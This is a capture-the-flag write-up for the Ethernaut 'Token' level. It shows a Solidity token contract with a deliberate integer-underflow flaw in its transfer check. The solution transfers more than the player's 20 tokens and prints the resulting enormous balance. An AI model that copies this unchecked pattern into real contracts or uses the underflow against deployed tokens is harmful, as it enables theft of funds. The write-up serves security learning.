---
title: "Token"
tags: ["Overflow"]
reference: https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
---

# Description

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

# Solution

1. unsigned integer overflow attack

```
contract.transfer(instance, 30)
```

2. check balance of player

```
await contract.balanceOf(player)
i {negative: 0, words: Array(11), length: 10, red: null}
length
: 
10
negative
: 
0
red
: 
null
words
: 
Array(11)
0
: 
67108833
1
: 
67108863
2
: 
67108863
3
: 
67108863
4
: 
67108863
5
: 
67108863
6
: 
67108863
7
: 
67108863
8
: 
67108863
9
: 
4194303
```
